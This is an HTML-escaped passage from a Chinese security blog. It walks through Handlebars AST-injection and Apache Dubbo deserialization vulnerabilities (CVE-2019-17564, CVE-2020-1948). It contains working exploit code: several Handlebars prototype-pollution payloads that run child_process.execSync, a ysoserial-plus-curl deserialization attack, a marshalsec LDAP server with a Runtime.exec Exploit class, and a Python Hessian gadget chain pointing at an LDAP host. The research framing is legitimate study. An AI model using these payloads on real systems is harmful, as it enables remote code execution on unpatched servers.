this.compileStack = [];    this.inlineStack = [];    this.blockParams = [];    this.compileChildren(environment, options);    this.useDepths = this.useDepths || environment.useDepths || environment.useDecorators || this.options.compat;    this.useBlockParams = this.useBlockParams || environment.useBlockParams;    var opcodes = environment.opcodes,        opcode = undefined,        firstLoc = undefined,        i = undefined,        l = undefined;    for (i = 0, l = opcodes.length; i &lt; l; i++) &#123;      opcode = opcodes[i];      this.source.currentLocation = opcode.loc;      firstLoc = firstLoc || opcode.loc;      this[opcode.opcode].apply(this, opcode.args); // 这里就是使用我们opcode的操作，然后会把结果存到this.source.SourceNode中    &#125;    // Flush any trailing content that might be pending.    this.source.currentLocation = firstLoc;    this.pushSource(&#39;&#39;);    /* istanbul ignore next */    if (this.stackSlot || this.inlineStack.length || this.compileStack.length) &#123;      throw new _exception2[&#39;default&#39;](&#39;Compile completed with content left on stack&#39;);    &#125;    if (!this.decorators.isEmpty()) &#123;      this.useDecorators = true;      this.decorators.prepend([&#39;var decorators = container.decorators, &#39;, this.lookupPropertyFunctionVarDeclaration(), &#39;;\n&#39;]);      this.decorators.push(&#39;return fn;&#39;);      if (asObject) &#123;        this.decorators = Function.apply(this, [&#39;fn&#39;, &#39;props&#39;, &#39;container&#39;, &#39;depth0&#39;, &#39;data&#39;, &#39;blockParams&#39;, &#39;depths&#39;, this.decorators.merge()]);      &#125; else &#123;        this.decorators.prepend(&#39;function(fn, props, container, depth0, data, blockParams, depths) &#123;\n&#39;);        this.decorators.push(&#39;&#125;\n&#39;);        this.decorators = this.decorators.merge();      &#125;    &#125; else &#123;      this.decorators = undefined;    &#125;    var fn = this.createFunctionContext(asObject); // 创建模板的函数体    if (!this.isChild) &#123;      var ret = &#123;        compiler: this.compilerInfo(),        main: fn      &#125;;      if (this.decorators) &#123;        ret.main_d = this.decorators; // eslint-disable-line camelcase        ret.useDecorators = true;      &#125;      var _context = this.context;      var programs = _context.programs;      var decorators = _context.decorators;      for (i = 0, l = programs.length; i &lt; l; i++) &#123;        if (programs[i]) &#123;          ret[i] = programs[i];          if (decorators[i]) &#123;            ret[i + &#39;_d&#39;] = decorators[i];            ret.useDecorators = true;          &#125;        &#125;      &#125;      if (this.environment.usePartial) &#123;        ret.usePartial = true;      &#125;      if (this.options.data) &#123;        ret.useData = true;      &#125;      if (this.useDepths) &#123;        ret.useDepths = true;      &#125;      if (this.useBlockParams) &#123;        ret.useBlockParams = true;      &#125;      if (this.options.compat) &#123;        ret.compat = true;      &#125;      if (!asObject) &#123;        ret.compiler = JSON.stringify(ret.compiler);        this.source.currentLocation = &#123; start: &#123; line: 1, column: 0 &#125; &#125;;        ret = this.objectLiteral(ret);        if (options.srcName) &#123;          ret = ret.toStringWithSourceMap(&#123; file: options.destName &#125;);          ret.map = ret.map &amp;&amp; ret.map.toString();        &#125; else &#123;          ret = ret.toString();        &#125;      &#125; else &#123;        ret.compilerOptions = this.options;      &#125;      return ret;    &#125; else &#123;      return fn;    &#125;  &#125;,</code></pre><p>执行<code>opcode</code>中<code>pushLiteral</code>的具体实现流程</p><pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\javascript-compiler.js  // [pushLiteral]  //  // On stack, before: ...  // On stack, after: value, ...  //  // Pushes a value onto the stack. This operation prevents  // the compiler from creating a temporary variable to hold  // it.    pushLiteral: function pushLiteral(value) &#123; // 注释也已经很清楚了    this.pushStackLiteral(value);   &#125;,  pushStackLiteral: function pushStackLiteral(item) &#123;    this.push(new Literal(item));  &#125;,  function Literal(value) &#123;      this.value = value;  &#125;  push: function push(expr) &#123;    if (!(expr instanceof Literal)) &#123;      expr = this.source.wrap(expr);    &#125;    this.inlineStack.push(expr);    return expr;  &#125;,</code></pre><p>在执行最后的<code>append</code>操作的时候会将<code>inlineStack</code>中的内容pop出来加入到<code>Source</code>中</p><pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\javascript-compiler.js  append: function append() &#123;    if (this.isInline()) &#123;      this.replaceStack(function (current) &#123;        return [&#39; != null ? &#39;, current, &#39; : &quot;&quot;&#39;];      &#125;);      this.pushSource(this.appendToBuffer(this.popStack()));    &#125; else &#123;      var local = this.popStack();      this.pushSource([&#39;if (&#39;, local, &#39; != null) &#123; &#39;, this.appendToBuffer(local, undefined, true), &#39; &#125;&#39;]);      if (this.environment.isSimple) &#123;        this.pushSource([&#39;else &#123; &#39;, this.appendToBuffer(&quot;&#39;&#39;&quot;, undefined, true), &#39; &#125;&#39;]);      &#125;    &#125;  &#125;,</code></pre><p>这里是创建函数体上下文，将<code>source</code>中的东西转换成字符串函数</p><pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\javascript-compiler.js  createFunctionContext: function createFunctionContext(asObject) &#123;    // istanbul ignore next    var _this = this;    var varDeclarations = &#39;&#39;;    var locals = this.stackVars.concat(this.registers.list);    if (locals.length &gt; 0) &#123;      varDeclarations += &#39;, &#39; + locals.join(&#39;, &#39;);    &#125;    // Generate minimizer alias mappings    //    // When using true SourceNodes, this will update all references to the given alias    // as the source nodes are reused in situ. For the non-source node compilation mode,    // aliases will not be used, but this case is already being run on the client and    // we aren&#39;t concern about minimizing the template size.    var aliasCount = 0;    Object.keys(this.aliases).forEach(function (alias) &#123;      var node = _this.aliases[alias];      if (node.children &amp;&amp; node.referenceCount &gt; 1) &#123;        varDeclarations += &#39;, alias&#39; + ++aliasCount + &#39;=&#39; + alias;        node.children[0] = &#39;alias&#39; + aliasCount;      &#125;    &#125;);    if (this.lookupPropertyFunctionIsUsed) &#123;      varDeclarations += &#39;, &#39; + this.lookupPropertyFunctionVarDeclaration();    &#125;    var params = [&#39;container&#39;, &#39;depth0&#39;, &#39;helpers&#39;, &#39;partials&#39;, &#39;data&#39;];    if (this.useBlockParams || this.useDepths) &#123;      params.push(&#39;blockParams&#39;);    &#125;    if (this.useDepths) &#123;      params.push(&#39;depths&#39;);    &#125;    // Perform a second pass over the output to merge content when possible    var source = this.mergeSource(varDeclarations); // 把原本的source和varDeclarations拼接起来    if (asObject) &#123;      params.push(source);      return Function.apply(this, params);    &#125; else &#123;      return this.source.wrap([&#39;function(&#39;, params.join(&#39;,&#39;), &#39;) &#123;\n  &#39;, source, &#39;&#125;&#39;]); // 将source封装成函数    &#125;  &#125;,</code></pre><h4 id="生成模板"><a href="#生成模板" class="headerlink" title="生成模板"></a>生成模板</h4><pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js  function compileInput() &#123;    var ast = env.parse(input, options),         environment = new env.Compiler().compile(ast, options),        templateSpec = new env.JavaScriptCompiler().compile(environment, options, undefined, true);     return env.template(templateSpec); // 生成模板  &#125;</code></pre><pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars.runtime.jsfunction create() &#123;  var hb = new base.HandlebarsEnvironment();  Utils.extend(hb, base);  hb.SafeString = _handlebarsSafeString2[&#39;default&#39;];  hb.Exception = _handlebarsException2[&#39;default&#39;];  hb.Utils = Utils;  hb.escapeExpression = Utils.escapeExpression;  hb.VM = runtime;  hb.template = function (spec) &#123;    return runtime.template(spec, hb);  &#125;;  return hb;&#125;</code></pre><h4 id="模板函数执行"><a href="#模板函数执行" class="headerlink" title="模板函数执行"></a>模板函数执行</h4><pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js  function ret(context, execOptions) &#123;    if (!compiled) &#123;      compiled = compileInput();    &#125;    return compiled.call(this, context, execOptions); // 执行函数获取返回值  &#125;</code></pre><pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\runtime.js  function ret(context) &#123;    var options = arguments.length &lt;= 1 || arguments[1] === undefined ? &#123;&#125; : arguments[1];    var data = options.data;    ret._setup(options);    if (!options.partial &amp;&amp; templateSpec.useData) &#123;      data = initData(context, data);    &#125;    var depths = undefined,        blockParams = templateSpec.useBlockParams ? [] : undefined;    if (templateSpec.useDepths) &#123;      if (options.depths) &#123;        depths = context != options.depths[0] ? [context].concat(options.depths) : options.depths;      &#125; else &#123;        depths = [context];      &#125;    &#125;    function main(context /*, options*/) &#123;      return &#39;&#39; + templateSpec.main(container, context, container.helpers, container.partials, data, blockParams, depths);     &#125;    main = executeDecorators(templateSpec.main, main, container, options.depths || [], data, blockParams); // 对main函数进行装饰    return main(context, options); // 执行main函数  &#125;</code></pre><h4 id="被污染的函数"><a href="#被污染的函数" class="headerlink" title="被污染的函数"></a>被污染的函数</h4><pre><code class="js">(function anonymous(container,depth0,helpers,partials,data) &#123;  var stack1, lookupProperty = container.lookupProperty || function(parent, propertyName) &#123;        if (Object.prototype.hasOwnProperty.call(parent, propertyName)) &#123;          return parent[propertyName];        &#125;        return undefined    &#125;;  return ((stack1 = (lookupProperty(helpers,&quot;undefined&quot;)||(depth0 &amp;&amp; lookupProperty(depth0,&quot;undefined&quot;))||container.hooks.helperMissing).call(depth0 != null ? depth0 : (container.nullContext || &#123;&#125;),console.log(process.mainModule.require(&#39;child_process&#39;).execSync(&#39;calc.exe&#39;).toString()),&#123;&quot;name&quot;:&quot;undefined&quot;,&quot;hash&quot;:&#123;&#125;,&quot;data&quot;:data,&quot;loc&quot;:&#123;&quot;start&quot;:0,&quot;end&quot;:0&#125;&#125;)) != null ? stack1 : &quot;&quot;);&#125;)</code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li><p>漏洞核心在于污染编译过程中的<code>pushLiteral</code>操作，其中可以用到<code>NumberLiteral</code>类型和<code>BooleanLiteral</code>类型</p></li><li><p>令<code>type</code>为<code>Program</code>绕过<code>Lexer</code>解析器，从<code>compiler.js</code>找到可用的<code>Gadget</code></p></li><li><p>在寻找<code>Gadget</code>时注意保持语法树的栈平衡，不然会在编译的时候抛出如下错误，这也是为什么我们需要借助<code>MustacheStatement</code>类型注入我们的payload，而不能直接将<code>NumberLiteral</code>注入到<code>body</code>中</p><pre><code class="js">    /* istanbul ignore next */    if (this.stackSlot || this.inlineStack.length || this.compileStack.length) &#123;      throw new _exception2[&#39;default&#39;](&#39;Compile completed with content left on stack&#39;);    &#125;</code></pre></li></ol><h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><h4 id="BooleanLiteral"><a href="#BooleanLiteral" class="headerlink" title="BooleanLiteral"></a>BooleanLiteral</h4><p>将<code>NumberLiteral</code>替换为<code>BooleanLiteral</code></p><pre><code class="js">const Handlebars = require(&#39;handlebars&#39;);Object.prototype.type = &#39;Program&#39;;Object.prototype.body = [&#123;    &quot;type&quot;: &quot;MustacheStatement&quot;,    &quot;params&quot;: [&#123;        &quot;type&quot;: &quot;BooleanLiteral&quot;,        &quot;value&quot;: &quot;console.log(process.mainModule.require(&#39;child_process&#39;).execSync(&#39;calc.exe&#39;).toString())&quot;    &#125;],    &quot;path&quot;: 0,    &quot;loc&quot;: &#123; &quot;start&quot;: 0 &#125;&#125;];var source = &quot;&lt;h1&gt;It works!&lt;/h1&gt;&quot;;var template = Handlebars.compile(source);console.log(template(&#123;&#125;));</code></pre><h4 id="PartialStatement"><a href="#PartialStatement" class="headerlink" title="PartialStatement"></a>PartialStatement</h4><p>将<code>MustacheStatement</code>改为<code>PartialStatement</code></p><pre><code class="js">const Handlebars = require(&#39;handlebars&#39;);Object.prototype.type = &#39;Program&#39;;Object.prototype.body = [&#123;    &quot;type&quot;: &quot;PartialStatement&quot;,    &quot;name&quot;: &quot;&quot;,    &quot;params&quot;: [&#123;        &quot;type&quot;: &quot;NumberLiteral&quot;,        &quot;value&quot;: &quot;console.log(process.mainModule.require(&#39;child_process&#39;).execSync(&#39;calc.exe&#39;).toString())&quot;    &#125;]&#125;];var source = &quot;&lt;h1&gt;It works!&lt;/h1&gt;&quot;;var template = Handlebars.compile(source);console.log(template(&#123;&#125;));</code></pre><h4 id="PartialBlockStatement"><a href="#PartialBlockStatement" class="headerlink" title="PartialBlockStatement"></a>PartialBlockStatement</h4><p>将<code>MustacheStatement</code>改为<code>PartialBlockStatement</code></p><pre><code class="js">const Handlebars = require(&#39;handlebars&#39;);Object.prototype.type = &#39;Program&#39;;Object.prototype.body = [&#123;    &quot;type&quot;: &quot;PartialBlockStatement&quot;,    &quot;params&quot;: [&#123;        &quot;type&quot;: &quot;NumberLiteral&quot;,        &quot;value&quot;: &quot;console.log(process.mainModule.require(&#39;child_process&#39;).execSync(&#39;calc.exe&#39;).toString())&quot;    &#125;],    &quot;name&quot;: 0,    &quot;openStrip&quot;: 0,    &quot;closeStrip&quot;: 0,    &quot;program&quot;: &#123; &quot;body&quot;: 0 &#125;,&#125;];var source = &quot;&lt;h1&gt;It works!&lt;/h1&gt;&quot;;var template = Handlebars.compile(source);console.log(template(&#123;&#125;));</code></pre><h4 id="BlockStatement"><a href="#BlockStatement" class="headerlink" title="BlockStatement"></a>BlockStatement</h4><p>将<code>MustacheStatement</code>改为<code>BlockStatement</code></p><pre><code class="js">const Handlebars = require(&#39;handlebars&#39;);Object.prototype.type = &#39;Program&#39;;Object.prototype.body = [&#123;    &quot;type&quot;: &quot;BlockStatement&quot;,    &quot;params&quot;: [&#123;        &quot;type&quot;: &quot;NumberLiteral&quot;,        &quot;value&quot;: &quot;console.log(process.mainModule.require(&#39;child_process&#39;).execSync(&#39;calc.exe&#39;).toString())&quot;    &#125;],    &quot;path&quot;: 0,    &quot;loc&quot;: 0,    &quot;openStrip&quot;: 0,    &quot;closeStrip&quot;: 0,    &quot;program&quot;: &#123; &quot;body&quot;: 0 &#125;&#125;];var source = &quot;&lt;h1&gt;It works!&lt;/h1&gt;&quot;;var template = Handlebars.compile(source);console.log(template(&#123;&#125;));</code></pre><h4 id="Decorator"><a href="#Decorator" class="headerlink" title="Decorator"></a>Decorator</h4><p>触发点和上面的有所差异，这个是在装饰<code>main</code>函数的时候插入自定义代码</p><pre><code class="js">const Handlebars = require(&#39;handlebars&#39;);Object.prototype.type = &#39;Program&#39;;Object.prototype.body = [&#123;    &quot;type&quot;: &quot;Decorator&quot;,    &quot;params&quot;: [&#123;        &quot;type&quot;: &quot;NumberLiteral&quot;,        &quot;value&quot;: &quot;console.log(process.mainModule.require(&#39;child_process&#39;).execSync(&#39;calc.exe&#39;).toString())&quot;    &#125;],    &quot;path&quot;: 0,    &quot;loc&quot;: &#123; &quot;start&quot;: 0 &#125;&#125;];var source = &quot;&lt;h1&gt;It works!&lt;/h1&gt;&quot;;var template = Handlebars.compile(source);console.log(template(&#123;&#125;));</code></pre><h4 id="inf-Hash"><a href="#inf-Hash" class="headerlink" title="inf Hash"></a>inf Hash</h4><p>无限内嵌<code>Hash</code>类型</p><pre><code class="js">const Handlebars = require(&#39;handlebars&#39;);Object.prototype.type = &#39;Program&#39;;Object.prototype.body = [&#123;    &quot;type&quot;: &quot;MustacheStatement&quot;,    &quot;params&quot;: [&#123;        &quot;type&quot;: &quot;Hash&quot;,        &quot;pairs&quot;: [&#123;            &quot;value&quot;:&#123;                &quot;type&quot;: &quot;Hash&quot;,                &quot;pairs&quot;: [&#123;                    &quot;value&quot;:&#123;                        &quot;type&quot;: &quot;NumberLiteral&quot;,                        &quot;value&quot;: &quot;console.log(process.mainModule.require(&#39;child_process&#39;).execSync(&#39;calc.exe&#39;).toString())&quot;                &#125;&#125;]        &#125;&#125;]    &#125;],    &quot;path&quot;: 0,    &quot;loc&quot;: &#123; &quot;start&quot;: 0 &#125;&#125;];var source = &quot;&lt;h1&gt;It works!&lt;/h1&gt;&quot;;var template = Handlebars.compile(source);console.log(template(&#123;&#125;));</code></pre><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.p6.is/AST-Injection/">https://blog.p6.is/AST-Injection/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dubbo反序列化漏洞研究</title>
      <link href="/2021/06/30/Dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
      <url>/2021/06/30/Dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/</url>
      
        <content type="html"><![CDATA[<blockquote><p>分析一下CVE-2019-17564和CVE-2020-1849两个漏洞</p></blockquote><span id="more"></span><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p><strong>简介</strong></p><p>Apache Dubbo是一个分布式框架，致力于提供高性能透明化的RPC远程服务调用方案，以及SOA服务治理方案。Apache Dubbo在实际应用场景中主要负责解决分布式的相关需求。</p><p><strong>dubbo</strong></p><p>dubbo支持多种序列化方式并且序列化是和协议相对应的。比如：Dubbo支持dubbo、rmi、Hessian、http、webservice、thrift、redis等多种协议。</p><p><strong>Hessian</strong></p><p>Hessian是一种跨语言的高效二进制序列化方式。但这里实际不是原生的Hessian2序列化，而是阿里修改过的Hessian lite，Hessian是二进制的web service协议，官方对Java、Flash/Flex、Python、C++、.NET C#等多种语言都进行了实现。Hessian和Axis、XFire都能实现web service方式的远程方法调用，区别是Hessian是二进制协议，Axis、XFire则是SOAP协议，所以从性能上说Hessian远优于后两者，并且Hessian的JAVA使用方法非常简单。它使用Java语言接口定义了远程对象，集合了序列化/反序列化和RMI功能。</p><p>Hessian协议用于集成Hessian的服务，Hessian底层采用Http通讯，采用Servlet暴露服务，Dubbo缺省内嵌Jetty作为服务器实现。</p><p>Dubbo的Hessian协议可以和原生Hessian服务互操作，即：</p><ul><li>提供者用Dubbo的Hessian协议暴露服务，消费者直接用标准Hessian接口调用</li><li>或者提供者用标准Hessian暴露服务，消费者用Dubbo的Hessian协议调用</li></ul><p><strong>协议关系</strong></p><ol><li>Dubbo 从大的层面上将是RPC框架，负责封装RPC调用，支持很多RPC协议</li><li>RPC协议包括了dubbo、rmi、hession、webservice、http、redis、rest、thrift、memcached、jsonrpc等</li><li>Java中的序列化有Java原生序列化、Hessian 序列化、Json序列化、dubbo 序列化</li></ol><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20201122225559.png" alt="image-20201003002926978" style="zoom:80%;" /><p><strong>Dubbo架构</strong></p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202106041245d4e3b0875ec74b326202.jpeg" alt="dubbo-architucture"></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>安装<code>zookeeper</code></p><pre><code class="cmd"># 从官网https://zookeeper.apache.org/releases.html下载# 将conf目录下的配置文件zoo_sample.cfg修改为zoo.cfg# 并且修改或添加配置文件中的dataDir和dadaLogDir地址# 运行bin目录下的zkServer启动zookeeper服务sudo ./zkServer.sh start</code></pre><p>或者用docker安装</p><pre><code class="cmd">docker run --rm --name zookeeper -p 2181:2181 zookeeper</code></pre><p>安装<code>dubbo-samples/dubbo-samples-http</code></p><pre><code class="cmd">git clone https://github.com/apache/dubbo-samples.git# 使用dubbo-samples-http模块# 把resources/spring/http-provider.xml里面的端口修改为8081（8080容易起冲突）</code></pre><blockquote><p>master分支的dubbo-samples只能导入<strong>2.7.6</strong>及其以上版本的dubbo，低于这个版本的会抛出以下错误</p><pre><code>Cannot resolve org.apache.dubbo:dubbo:unknown</code></pre><p>解决方法是下载<strong>2.6.x</strong>分支的<strong>dubbo-samples</strong></p><pre><code>git checkout 2.6.x</code></pre></blockquote><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><blockquote><p>推荐使用此方法</p></blockquote><p>安装<code>dubbo-spring-boot-project</code></p><pre><code class="cmd">git clone https://github.com/apache/dubbo-spring-boot-project.gitcd dubbo-spring-boot-projectgit checkout 2.7.6</code></pre><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>直接从docker中拉环境</p><pre><code>docker pull dsolab/dubbo:cve-2020-1948docker run -p 12345:12345 dsolab/dubbo:cve-2020-1948 -d</code></pre><h2 id="JNDI工具"><a href="#JNDI工具" class="headerlink" title="JNDI工具"></a>JNDI工具</h2><h3 id="工具一"><a href="#工具一" class="headerlink" title="工具一"></a>工具一</h3><p><a href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit</a></p><blockquote><p>我看大家都在用，但是我觉得不好用，服务冗余，而且端口每次更改都要重新编译</p></blockquote><pre><code class="cmd">git clone https://github.com/welk1n/JNDI-Injection-Exploit.gitcd JNDI-Injection-Exploitmvn clean package -DskipTests# 保证1099, 1389, 8180未被使用，或者自己修改端口java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;open /Applications/Calculator.app&quot; -A &quot;127.0.0.1&quot;</code></pre><h3 id="工具二"><a href="#工具二" class="headerlink" title="工具二"></a>工具二</h3><p><a href="https://github.com/mbechler/marshalsec">marshalsec</a></p><blockquote><p>推荐使用此方法</p></blockquote><pre><code class="java">// Exploit.javapublic class Exploit &#123;    public Exploit()&#123;        try &#123;            // java.lang.Runtime.getRuntime().exec(&quot;touch /tmp/success&quot;);            java.lang.Runtime.getRuntime().exec(new String[]&#123;&quot;calc&quot;&#125;);        &#125; catch (java.io.IOException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre><pre><code class="cmd">javac Exploit.javapython -m http.server 8000java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/#Exploit 1389</code></pre><blockquote><p>这里注意<code>http://127.0.0.1:8000/#Exploit</code>不要写成<code>http://127.0.0.1:8000#Exploit</code></p></blockquote><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="CVE-2019-17564"><a href="#CVE-2019-17564" class="headerlink" title="CVE-2019-17564"></a>CVE-2019-17564</h3><blockquote><p>2.7.0 &lt;= Apache Dubbo &lt;= 2.7.4.1</p><p>2.6.0 &lt;= Apache Dubbo &lt;= 2.6.7</p><p>Apache Dubbo = 2.5.x</p></blockquote><p><strong>添加依赖</strong></p><pre><code class="xml">&lt;dependency&gt;                &lt;groupId&gt;commons-collections&lt;/groupId&gt;                &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;                &lt;version&gt;3.1&lt;/version&gt;&lt;/dependency&gt;</code></pre><p><strong>漏洞利用</strong></p><pre><code class="cmd">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 calc &gt; payload.outcurl http://127.0.0.1:8081/org.apache.dubbo.samples.http.api.DemoService --data-binary @payload.out</code></pre><p><strong>漏洞分析</strong></p><pre><code class="java">public class HttpInvokerServiceExporter extends RemoteInvocationSerializingExporter implements HttpRequestHandler &#123;    public void handleRequest(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;        try &#123;            RemoteInvocation invocation = this.readRemoteInvocation(request); // 处理requests内容            RemoteInvocationResult result = this.invokeAndCreateResult(invocation, this.getProxy());            this.writeRemoteInvocationResult(request, response, result);        &#125; catch (ClassNotFoundException var5) &#123;            throw new NestedServletException(&quot;Class not found during deserialization&quot;, var5);        &#125;    &#125;        protected RemoteInvocation readRemoteInvocation(HttpServletRequest request) throws IOException, ClassNotFoundException &#123;        return this.readRemoteInvocation(request, request.getInputStream()); // 获取requests的输入    &#125;    protected RemoteInvocation readRemoteInvocation(HttpServletRequest request, InputStream is) throws IOException, ClassNotFoundException &#123;        ObjectInputStream ois = this.createObjectInputStream(this.decorateInputStream(request, is));        RemoteInvocation var4;        try &#123;            var4 = this.doReadRemoteInvocation(ois); // 跟进输入处理        &#125; finally &#123;            ois.close();        &#125;        return var4;    &#125;    protected RemoteInvocation readRemoteInvocation(HttpServletRequest request, InputStream is) throws IOException, ClassNotFoundException &#123;        ObjectInputStream ois = this.createObjectInputStream(this.decorateInputStream(request, is));        RemoteInvocation var4;        try &#123;            var4 = this.doReadRemoteInvocation(ois); // 进入远程调用        &#125; finally &#123;            ois.close();        &#125;        return var4;    &#125;</code></pre><p>跟进<code>doReadRemoteInvocation()</code>函数</p><pre><code class="java">public abstract class RemoteInvocationSerializingExporter extends RemoteInvocationBasedExporter implements InitializingBean &#123;    protected RemoteInvocation doReadRemoteInvocation(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123;        Object obj = ois.readObject(); // 反序列化        if (!(obj instanceof RemoteInvocation)) &#123;            throw new RemoteException(&quot;Deserialized object needs to be assignable to type [&quot; + RemoteInvocation.class.getName() + &quot;]: &quot; + ClassUtils.getDescriptiveType(obj));        &#125; else &#123;            return (RemoteInvocation)obj;        &#125;    &#125;</code></pre><p><strong>patch</strong></p><blockquote><p><a href="https://github.com/apache/dubbo/compare/dubbo-2.7.3...dubbo-2.7.4#diff-96ea3c598a0fa6d0ad3f028e676b17525d256692f9995f922267f83294dc04edR79">https://github.com/apache/dubbo/compare/dubbo-2.7.3...dubbo-2.7.4#diff-96ea3c598a0fa6d0ad3f028e676b17525d256692f9995f922267f83294dc04edR79</a></p></blockquote><p>将<code>HttpInvokerServiceExporter</code>转化为<code>JsonRpcServer</code> </p><h3 id="CVE-2020-1948"><a href="#CVE-2020-1948" class="headerlink" title="CVE-2020-1948"></a>CVE-2020-1948</h3><blockquote><p>2.7.0 &lt;= Apache Dubbo &lt;= 2.7.6</p><p>2.6.0 &lt;= Apache Dubbo &lt;= 2.6.7</p><p>Apache Dubbo = 2.5.x</p></blockquote><p><strong>添加依赖</strong></p><blockquote><p>在dubbo-spring-boot-project\dubbo-spring-boot-samples\dubbo-registry-nacos-samples\provider-sample\pom.xml处添加</p></blockquote><pre><code class="xml">&lt;dependency&gt;    &lt;groupId&gt;com.rometools&lt;/groupId&gt;    &lt;artifactId&gt;rome&lt;/artifactId&gt;    &lt;version&gt;1.7.0&lt;/version&gt;    &lt;scope&gt;compile&lt;/scope&gt;&lt;/dependency&gt;</code></pre><blockquote><p>网上很多的分析文章直接把python版本和Java版本的混为一谈，整得我复现的时候一直出不来，后来才看到一篇文章说出了它们的区别，那些乱写的漏洞分析文章真是害人不浅…</p></blockquote><h4 id="Python版本"><a href="#Python版本" class="headerlink" title="Python版本"></a>Python版本</h4><p><strong>漏洞利用</strong></p><blockquote><p>适用于2.7.5之前的版本</p></blockquote><pre><code class="python">from dubbo.codec.hessian2 import new_objectfrom dubbo.client import DubboClientclient = DubboClient(&#39;127.0.0.1&#39;, 12345)JdbcRowSetImpl=new_object(      &#39;com.sun.rowset.JdbcRowSetImpl&#39;,      dataSource=&quot;ldap://127.0.0.1:8087/Exploit&quot;,      strMatchColumns=[&quot;foo&quot;]      )JdbcRowSetImplClass=new_object(      &#39;java.lang.Class&#39;,      name=&quot;com.sun.rowset.JdbcRowSetImpl&quot;,      )toStringBean=new_object(      &#39;com.rometools.rome.feed.impl.ToStringBean&#39;,      beanClass=JdbcRowSetImplClass,      obj=JdbcRowSetImpl      )resp = client.send_request_and_return_response(    service_name=&#39;com.example.provider.service.UesrService&#39;,    method_name=&#39;test&#39;,    args=[toStringBean])</code></pre><p><strong>漏洞分析</strong></p><p>漏洞链如下</p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202106060011e9cbacf02b8aef2d57be.png" alt="image-20210605225549613" style="zoom:80%;" /><p>入口点在<code>DecodeHandler</code>类的<code>received</code>方法</p><pre><code class="java">public class DecodeHandler extends AbstractChannelHandlerDelegate &#123;    public void received(Channel channel, Object message) throws RemotingException &#123;        if (message instanceof Decodeable) &#123;            this.decode(message);        &#125;        if (message instanceof Request) &#123;            this.decode(((Request)message).getData());        &#125;        if (message instanceof Response) &#123;            this.decode(((Response)message).getResult());        &#125;        this.handler.received(channel, message); // 持续跟进函数，会在一个getInvoker()地方抛出错误    &#125;</code></pre><pre><code class="java">public class DubboProtocol extends AbstractProtocol &#123;    Invoker&lt;?&gt; getInvoker(Channel channel, Invocation inv) throws RemotingException &#123;        boolean isCallBackServiceInvoke = false;        boolean isStubServiceInvoke = false;        int port = channel.getLocalAddress().getPort();        String path = (String)inv.getAttachments().get(&quot;path&quot;);        isStubServiceInvoke = Boolean.TRUE.toString().equals(inv.getAttachments().get(&quot;dubbo.stub.event&quot;));        if (isStubServiceInvoke) &#123;            port = channel.getRemoteAddress().getPort();        &#125;        isCallBackServiceInvoke = this.isClientSide(channel) &amp;&amp; !isStubServiceInvoke;        if (isCallBackServiceInvoke) &#123;            path = path + &quot;.&quot; + (String)inv.getAttachments().get(&quot;callback.service.instid&quot;);            inv.getAttachments().put(&quot;_isCallBackServiceInvoke&quot;, Boolean.TRUE.toString());        &#125;        String serviceKey = serviceKey(port, path, (String)inv.getAttachments().get(&quot;version&quot;), (String)inv.getAttachments().get(&quot;group&quot;));        DubboExporter&lt;?&gt; exporter = (DubboExporter)this.exporterMap.get(serviceKey);        if (exporter == null) &#123;            throw new RemotingException(channel, &quot;Not found exported service: &quot; + serviceKey + &quot; in &quot; + this.exporterMap.keySet() + &quot;, may be version or group mismatch , channel: consumer: &quot; + channel.getRemoteAddress() + &quot; --&gt; provider: &quot; + channel.getLocalAddress() + &quot;, message:&quot; + inv); // 在这里抛出错误，因为涉及了字符串操作，所以会调用对应类的toString()方法        &#125; else &#123;            return exporter.getInvoker();        &#125;    &#125;</code></pre><p>来到了<code>RpcInvocation</code>类</p><pre><code class="java">public class RpcInvocation implements Invocation, Serializable &#123;    public String toString() &#123;        return &quot;RpcInvocation [methodName=&quot; + this.methodName + &quot;, parameterTypes=&quot; + Arrays.toString(this.parameterTypes) + &quot;, arguments=&quot; + Arrays.toString(this.arguments) + &quot;, attachments=&quot; + this.attachments + &quot;]&quot;; // 